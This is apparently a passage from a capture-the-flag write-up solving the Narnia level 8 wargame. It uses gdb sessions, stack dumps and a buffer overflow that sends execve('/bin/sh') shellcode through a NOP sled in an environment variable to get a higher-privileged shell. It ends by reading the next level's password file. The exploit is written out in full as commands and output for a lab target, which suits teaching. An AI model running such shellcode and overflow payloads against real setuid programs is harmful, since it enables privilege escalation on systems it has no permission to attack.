+Starting program: /narnia/narnia8 $(python -c "print 'A'*20 + '\xd0\xd8\xff\xff' + 'B'*12 + '\xf0\xd6\xff\xff' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
+
+Breakpoint 1, 0x08048454 in func ()
+(gdb) c
+Continuing.
+AAAAAAAAAAAAAAAAAAAAÐØÿÿBBBBBBBBBBBBðÖÿÿ1ÀPh//shh/binãÁ°
+                                                        ̀1À@̀ÓÊã÷
+process 3149 is executing new program: /bin/dash
+Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
+Error in re-setting breakpoint 1: No symbol "func" in current context.
+Error in re-setting breakpoint 1: No symbol "func" in current context.
+Error in re-setting breakpoint 1: No symbol "func" in current context.
+$ whoami
+narnia8
+$ 
+
+narnia8@narnia:/narnia$ ./narnia8 `python -c "print 'A'*20 + '\xd0\xd8\xff\xff' + 'B'*12 + '\xf0\xd6\xff\xff' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"`
+AAAAAAAAAAAAAAAAAAAAÐBÿÿ
+narnia8@narnia:/narnia$ 
+
+This proved to be incredibly troublesome, I spent several hours and could not get the addresses to work properly. So I decided to just give up and put the shellcode in an environment variable instead.
+
+ 
+unset env LINES
+unset env COLUMNS
+break *func+49
+break *func+111
+
+x/s *((char **)environ)
+
+It was really tricky to get the addresses correct, so I use a NOP sled to make it much easier.
+
+I noticed in gdb that PWD gets added even if you start with a blank environment so we need to take that into account as well.
+NOP sled and shellcode goes into an environment variable when we launch narnia8 with the overflow
+
+narnia8@narnia:/narnia$ env -i EGG=`python -c "print '\x90'*256 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"` PWD="/narnia" gdb /narnia/narnia8
+GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from /narnia/narnia8...(no debugging symbols found)...done.
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) break *func+49
+Breakpoint 1 at 0x804845e
+(gdb) break *func+111
+Breakpoint 2 at 0x804849c
+(gdb) run $(python -c "print 'A'*20 + '\xff\xff\xff\xff' + 'B'*12 + '\xff\xff\xff\xff'")
+Starting program: /narnia/narnia8 $(python -c "print 'A'*20 + '\xff\xff\xff\xff' + 'B'*12 + '\xff\xff\xff\xff'")
+
+Breakpoint 1, 0x0804845e in func ()
+(gdb) x/64x $esp
+0xffffdcb0:	0xffffdcc8	0x00000000	0x00000014	0xf7e55fe3
+0xffffdcc0:	0x00000000	0x002c307d	0x00000000	0x00000000
+0xffffdcd0:	0x00000000	0x00000000	0x00000000	0xffffde92
+0xffffdce0:	0x00000002	0xffffdda4	0xffffdd08	0x080484cd
+0xffffdcf0:	0xffffde92	0xf7ffd000	0x080484fb	0xf7fcc000
+0xffffdd00:	0x080484f0	0x00000000	0x00000000	0xf7e3cad3
+0xffffdd10:	0x00000002	0xffffdda4	0xffffddb0	0xf7feacca
+0xffffdd20:	0x00000002	0xffffdda4	0xffffdd44	0x080497a4
+0xffffdd30:	0x0804820c	0xf7fcc000	0x00000000	0x00000000
+0xffffdd40:	0x00000000	0x4cae6e39	0x74816a29	0x00000000
+0xffffdd50:	0x00000000	0x00000000	0x00000002	0x08048330
+0xffffdd60:	0x00000000	0xf7ff04c0	0xf7e3c9e9	0xf7ffd000
+0xffffdd70:	0x00000002	0x08048330	0x00000000	0x08048351
+0xffffdd80:	0x080484ae	0x00000002	0xffffdda4	0x080484f0
+0xffffdd90:	0x08048560	0xf7feb160	0xffffdd9c	0x0000001c
+0xffffdda0:	0x00000002	0xffffde82	0xffffde92	0x00000000
+
+dump stack to find what the first pointer should be to the argument, 0xffffde92
+
+(gdb) x/s *((char **)environ)
+0xffffdebb:	"EGG=", '\220' <repeats 196 times>...
+(gdb)                        
+0xffffdf83:	'\220' <repeats 60 times>, "\061\300Ph//shh/bin\211\343\211\301\211\302\260\v\315\200\061\300@\315\200"
+(gdb) 
+0xffffdfdc:	"PWD=/narnia"
+
+find the address of EGG environment variable, 0xffffdebb, rewrite overflow and run
+
+(gdb) run $(python -c "print 'A'*20 + '\x92\xde\xff\xff' + 'B'*12 + '\xbb\xde\xff\xff'")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia8 $(python -c "print 'A'*20 + '\x92\xde\xff\xff' + 'B'*12 + '\xbb\xde\xff\xff'")
+
+Breakpoint 1, 0x0804845e in func ()
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x0804849c in func ()
+(gdb) c
+Continuing.
+AAAAAAAAAAAAAAAAAAAAÞÿÿBBBBBBBBBBBB»ÞÿÿÞÿÿ
+process 101 is executing new program: /bin/dash
+Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
+Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
+Error in re-setting breakpoint 1: No symbol "func" in current context.
+Error in re-setting breakpoint 2: No symbol "func" in current context.
+Error in re-setting breakpoint 1: No symbol "func" in current context.
+Error in re-setting breakpoint 2: No symbol "func" in current context.
+Error in re-setting breakpoint 1: No symbol "func" in current context.
+Error in re-setting breakpoint 2: No symbol "func" in current context.
+$ 
+
+success, lets try and run it in outside of gdb now
+
+
+narnia8@narnia:/narnia$ env -i EGG=`python -c "print '\x90'*256 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"` PWD="/narnia" /narnia/narnia8 `python -c "print 'A'*20 + '\x92\xde\xff\xff' + 'B'*12 + '\xbb\xde\xff\xff'"`
+AAAAAAAAAAAAAAAAAAAAÞÿÿBBBBBBBBBBBB»ÞÿÿÞÿÿ
+$ whoami
+narnia9
+$ cat /etc/narnia_pass/narnia9
+**********
+$ 
+
+Success!
+
+Note, any number of addresses should work for the eip overwrite, the NOP sled is large and so you can guess pretty quickly if you dont want to actually figure it out.
+
+narnia9@narnia:~$ ls
+CONGRATULATIONS
+narnia9@narnia:~$ cat CONGRATULATIONS 
+you are l33t! next plz...
+
+(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
+narnia9@narnia:~$ 
